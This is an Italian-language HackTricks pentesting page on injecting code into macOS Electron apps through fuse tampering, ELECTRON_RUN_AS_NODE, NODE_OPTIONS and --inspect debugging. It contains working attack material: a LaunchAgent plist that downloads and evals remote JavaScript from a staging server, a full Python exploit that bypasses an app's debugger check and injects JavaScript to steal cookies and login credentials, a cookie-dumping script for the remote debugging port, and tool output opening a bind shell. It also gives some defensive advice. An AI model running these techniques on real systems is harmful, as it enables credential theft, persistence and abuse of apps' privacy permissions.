# macOS Electron Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Informazioni di Base

Se non sai cos'è Electron, puoi trovare [**molte informazioni qui**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Ma per ora sappi solo che Electron esegue **node**.\
E node ha alcuni **parametri** e **variabili d'ambiente** che possono essere utilizzati per **far eseguire altro codice** oltre al file indicato.

### Fusi di Electron

Queste tecniche saranno discusse in seguito, ma recentemente Electron ha aggiunto diversi **flag di sicurezza per prevenirle**. Questi sono i [**Fusi di Electron**](https://www.electronjs.org/docs/latest/tutorial/fuses) e questi sono quelli usati per **prevenire** che le app Electron su macOS **carichino codice arbitrario**:

- **`RunAsNode`**: Se disabilitato, impedisce l'uso della variabile d'ambiente **`ELECTRON_RUN_AS_NODE`** per iniettare codice.
- **`EnableNodeCliInspectArguments`**: Se disabilitato, parametri come `--inspect`, `--inspect-brk` non saranno rispettati. Evitando in questo modo di iniettare codice.
- **`EnableEmbeddedAsarIntegrityValidation`**: Se abilitato, il **file** **`asar`** caricato sarà **validato** da macOS. **Prevenendo** in questo modo **l'iniezione di codice** modificando i contenuti di questo file.
- **`OnlyLoadAppFromAsar`**: Se questo è abilitato, invece di cercare di caricare nell'ordine seguente: **`app.asar`**, **`app`** e infine **`default_app.asar`**. Controllerà e utilizzerà solo app.asar, garantendo così che quando è **combinato** con il fuso **`embeddedAsarIntegrityValidation`** sia **impossibile** **caricare codice non validato**.
- **`LoadBrowserProcessSpecificV8Snapshot`**: Se abilitato, il processo del browser utilizza il file chiamato `browser_v8_context_snapshot.bin` per il suo snapshot V8.

Un altro fuso interessante che non impedirà l'iniezione di codice è:

- **EnableCookieEncryption**: Se abilitato, il negozio di cookie su disco è crittografato utilizzando chiavi crittografiche a livello di OS.

### Controllare i Fusi di Electron

Puoi **controllare questi flag** da un'applicazione con:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Modificare i Fuses di Electron

Come menzionano le [**docs**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), la configurazione dei **Fuses di Electron** è configurata all'interno del **binario di Electron** che contiene da qualche parte la stringa **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.

Nelle applicazioni macOS questo si trova tipicamente in `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Puoi caricare questo file in [https://hexed.it/](https://hexed.it/) e cercare la stringa precedente. Dopo questa stringa puoi vedere in ASCII un numero "0" o "1" che indica se ogni fusibile è disabilitato o abilitato. Modifica semplicemente il codice esadecimale (`0x30` è `0` e `0x31` è `1`) per **modificare i valori dei fusibili**.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

Nota che se provi a **sovrascrivere** il **`Electron Framework`** binario all'interno di un'applicazione con questi byte modificati, l'app non verrà eseguita.

## RCE aggiungendo codice alle applicazioni Electron

Potrebbero esserci **file JS/HTML esterni** che un'app Electron sta utilizzando, quindi un attaccante potrebbe iniettare codice in questi file la cui firma non verrà controllata ed eseguire codice arbitrario nel contesto dell'app.

> [!CAUTION]
> Tuttavia, al momento ci sono 2 limitazioni:
>
> - Il permesso **`kTCCServiceSystemPolicyAppBundles`** è **necessario** per modificare un'app, quindi per impostazione predefinita questo non è più possibile.
> - Il file compilato **`asap`** di solito ha i fusibili **`embeddedAsarIntegrityValidation`** `e` **`onlyLoadAppFromAsar`** `abilitati`
>
> Rendendo questo percorso di attacco più complicato (o impossibile).

Nota che è possibile bypassare il requisito di **`kTCCServiceSystemPolicyAppBundles`** copiando l'applicazione in un'altra directory (come **`/tmp`**), rinominando la cartella **`app.app/Contents`** in **`app.app/NotCon`**, **modificando** il file **asar** con il tuo codice **maligno**, rinominandolo di nuovo in **`app.app/Contents`** ed eseguendolo.

Puoi estrarre il codice dal file asar con:
```bash
npx asar extract app.asar app-decomp
```
E imballalo di nuovo dopo averlo modificato con:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE con ELECTRON_RUN_AS_NODE

Secondo [**la documentazione**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), se questa variabile di ambiente è impostata, avvierà il processo come un normale processo Node.js.
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> Se il fuse **`RunAsNode`** è disabilitato, la variabile d'ambiente **`ELECTRON_RUN_AS_NODE`** verrà ignorata e questo non funzionerà.

### Iniezione dal Plist dell'App

Come [**proposto qui**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), potresti abusare di questa variabile d'ambiente in un plist per mantenere la persistenza:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE con `NODE_OPTIONS`

Puoi memorizzare il payload in un file diverso ed eseguirlo:
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> Se il fusibile **`EnableNodeOptionsEnvironmentVariable`** è **disabilitato**, l'app **ignorerà** la variabile d'ambiente **NODE_OPTIONS** quando viene avviata, a meno che la variabile d'ambiente **`ELECTRON_RUN_AS_NODE`** non sia impostata, che sarà anch'essa **ignorata** se il fusibile **`RunAsNode`** è disabilitato.
>
> Se non imposti **`ELECTRON_RUN_AS_NODE`**, troverai l'**errore**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### Iniezione dal Plist dell'App

Potresti abusare di questa variabile d'ambiente in un plist per mantenere la persistenza aggiungendo queste chiavi:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE con ispezione

Secondo [**questo**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), se esegui un'applicazione Electron con flag come **`--inspect`**, **`--inspect-brk`** e **`--remote-debugging-port`**, un **porta di debug sarà aperta** così puoi connetterti ad essa (ad esempio da Chrome in `chrome://inspect`) e sarai in grado di **iniettare codice su di essa** o persino avviare nuovi processi.\
Ad esempio:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
In [**questo post del blog**](https://hackerone.com/reports/1274695), questo debugging viene abusato per far sì che un chrome headless **scarichi file arbitrari in posizioni arbitrarie**.

> [!TIP]
> Se un'app ha un modo personalizzato per controllare se le variabili di ambiente o i parametri come `--inspect` sono impostati, potresti provare a **bypassarlo** in fase di esecuzione usando l'argomento `--inspect-brk`, che **fermerà l'esecuzione** all'inizio dell'app e eseguirà un bypass (sovrascrivendo gli argomenti o le variabili di ambiente del processo corrente, ad esempio).

Il seguente era un exploit che monitorando ed eseguendo l'app con il parametro `--inspect-brk` era possibile bypassare la protezione personalizzata che aveva (sovrascrivendo i parametri del processo per rimuovere `--inspect-brk`) e poi iniettare un payload JS per estrarre cookie e credenziali dall'app:
```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

fs.writeFile(filePath, data, (err) => {
if (err) {
console.error(`Error writing to file ${filePath}:`, err);
} else {
console.log(`File written successfully at ${filePath}`);
}
});
}

function get_cookies() {
intervalIdCookies = setInterval(() => {
console.log("Checking cookies...");
wc.session.cookies.get({})
.then((cookies) => {
tokenCookie = cookies.find(cookie => cookie.name === "token");
if (tokenCookie){
writeToFile("/tmp/cookies.txt", cookies);
clearInterval(intervalIdCookies);
wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
}
})
}, 1000);
}

function get_creds() {
in_location = false;
intervalIdCreds = setInterval(() => {
if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
in_location = true;
console.log("Injecting creds logger...");
wc.executeJavaScript(`
(function() {
email = document.getElementById('login_email_id');
password = document.getElementById('login_password_id');
if (password && email) {
return email.value+":"+password.value;
}
})();
`).then(result => {
writeToFile("/tmp/victim_credentials.txt", result);
})
}
else if (in_location) {
wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
clearInterval(intervalIdCreds);
}
}, 10); // Check every 10ms
setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
"""
Fetch the local inspector's WebSocket URL from the JSON endpoint.
Assumes there's exactly one debug target.
"""
global INSPECT_URL

url = "http://127.0.0.1:9229/json"
response = requests.get(url)
data = response.json()
if not data:
raise RuntimeError("No debug targets found on port 9229.")
# data[0] should contain an object with "webSocketDebuggerUrl"
ws_url = data[0].get("webSocketDebuggerUrl")
if not ws_url:
raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
INSPECT_URL = ws_url


async def monitor_victim():
print("Monitoring victim process...")
found = False
while not found:
sleep(1)  # Check every second
for process in psutil.process_iter(attrs=['pid', 'name']):
try:
# Check if the process name contains "victim"
if process.info['name'] and 'victim' in process.info['name']:
found = True
print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
os.kill(process.info['pid'], 9)  # Force kill the process
except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
# Handle processes that might have terminated or are inaccessible
pass
os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
global CONTEXT_ID, NAME, UNIQUE_ID
print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]

sleep(1)

await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

await send_cmd(ws, "Profiler.enable")

await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
print("Injected code to bypass protections")


async def js_payloads():
global CONT, CONTEXT_ID, NAME, UNIQUE_ID

print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]
await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
await monitor_victim()
sleep(3)
await get_debugger_url()
await bypass_protections()

sleep(7)

await js_payloads()



async def send_cmd(ws, method, get_first=False, params={}):
"""
Send a command to the inspector and read until we get a response with matching "id".
"""
global CONT

CONT += 1

# Send the command
await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
sleep(0.4)

# Read messages until we get our command result
while True:
response = await ws.recv()
data = json.loads(response)

# Print for debugging
print(f"[{method} / {CONT}] ->", data)

if get_first:
return data

# If this message is a response to our command (by matching "id"), break
if data.get("id") == CONT:
return data

# Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
asyncio.run(main())
```
> [!CAUTION]
> Se il fuse **`EnableNodeCliInspectArguments`** è disabilitato, l'app **ignorerà i parametri node** (come `--inspect`) quando viene avviata, a meno che la variabile di ambiente **`ELECTRON_RUN_AS_NODE`** non sia impostata, che sarà anch'essa **ignorata** se il fuse **`RunAsNode`** è disabilitato.
>
> Tuttavia, puoi comunque utilizzare il **parametro electron `--remote-debugging-port=9229`**, ma il payload precedente non funzionerà per eseguire altri processi.

Utilizzando il parametro **`--remote-debugging-port=9222`** è possibile rubare alcune informazioni dall'App Electron come la **cronologia** (con comandi GET) o i **cookie** del browser (poiché sono **decrittografati** all'interno del browser e c'è un **endpoint json** che li fornirà).

Puoi imparare come farlo [**qui**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) e [**qui**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) e utilizzare lo strumento automatico [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) o uno script semplice come:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
### Injection from the App Plist

Puoi abusare di questa variabile di ambiente in un plist per mantenere la persistenza aggiungendo queste chiavi:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC Bypass abusando di versioni precedenti

> [!TIP]
> Il demone TCC di macOS non controlla la versione eseguita dell'applicazione. Quindi, se **non puoi iniettare codice in un'applicazione Electron** con nessuna delle tecniche precedenti, puoi scaricare una versione precedente dell'APP e iniettare codice su di essa poiché otterrà comunque i privilegi TCC (a meno che il Trust Cache non lo impedisca).

## Esegui codice non JS

Le tecniche precedenti ti permetteranno di eseguire **codice JS all'interno del processo dell'applicazione electron**. Tuttavia, ricorda che i **processi figli vengono eseguiti sotto lo stesso profilo sandbox** dell'applicazione genitore e **erediteranno i loro permessi TCC**.\
Pertanto, se desideri abusare dei diritti per accedere alla fotocamera o al microfono, ad esempio, puoi semplicemente **eseguire un altro binario dal processo**.

## Vulnerabilità note di Electron su macOS (2023-2024)

### CVE-2023-44402 – Bypass dell'integrità ASAR

Electron ≤22.3.23 e varie versioni preliminari 23-27 hanno consentito a un attaccante con accesso in scrittura alla cartella `.app/Contents/Resources` di bypassare i fusibili `embeddedAsarIntegrityValidation` **e** `onlyLoadAppFromAsar`. Il bug era una *confusione del tipo di file* nel controllore di integrità che ha permesso a una **directory chiamata `app.asar`** di essere caricata invece dell'archivio convalidato, quindi qualsiasi JavaScript posizionato all'interno di quella directory veniva eseguito all'avvio dell'app. Anche i fornitori che avevano seguito le linee guida di indurimento e abilitato entrambi i fusibili erano quindi ancora vulnerabili su macOS.

Versioni di Electron corrette: **22.3.24**, **24.8.3**, **25.8.1**, **26.2.1** e **27.0.0-alpha.7**. Gli attaccanti che trovano un'applicazione in esecuzione su una build precedente possono sovrascrivere `Contents/Resources/app.asar` con la propria directory per eseguire codice con i diritti TCC dell'applicazione.

### Cluster CVE “RunAsNode” / “enableNodeCliInspectArguments” 2024

A gennaio 2024, una serie di CVE (CVE-2024-23738 fino a CVE-2024-23743) ha evidenziato che molte app Electron vengono fornite con i fusibili **RunAsNode** e **EnableNodeCliInspectArguments** ancora abilitati. Un attaccante locale può quindi rilanciare il programma con la variabile ambiente `ELECTRON_RUN_AS_NODE=1` o flag come `--inspect-brk` per trasformarlo in un processo Node.js *generico* e ereditare tutti i permessi sandbox e TCC dell'applicazione.

Sebbene il team di Electron abbia contestato la valutazione "critica" e abbia notato che un attaccante ha già bisogno di esecuzione di codice locale, il problema è comunque prezioso durante il post-exploitation perché trasforma qualsiasi pacchetto Electron vulnerabile in un binario *living-off-the-land* che può ad esempio leggere Contatti, Foto o altre risorse sensibili precedentemente concesse all'app desktop.

Indicazioni difensive dai manutentori di Electron:

* Disabilita i fusibili `RunAsNode` e `EnableNodeCliInspectArguments` nelle build di produzione.
* Usa la nuova API **UtilityProcess** se la tua applicazione ha legittimamente bisogno di un processo Node.js di supporto invece di riabilitare quei fusibili.

## Iniezione automatica

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

Lo strumento [**electroniz3r**](https://github.com/r3ggi/electroniz3r) può essere facilmente utilizzato per **trovare applicazioni electron vulnerabili** installate e iniettare codice su di esse. Questo strumento cercherà di utilizzare la tecnica **`--inspect`**:

Devi compilarlo tu stesso e puoi usarlo in questo modo:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

Loki è stato progettato per inserire un backdoor nelle applicazioni Electron sostituendo i file JavaScript delle applicazioni con i file JavaScript di comando e controllo di Loki.


## Riferimenti

- [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
- [https://www.electronjs.org/blog/statement-run-as-node-cves](https://www.electronjs.org/blog/statement-run-as-node-cves)
- [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

{{#include ../../../banners/hacktricks-training.md}}
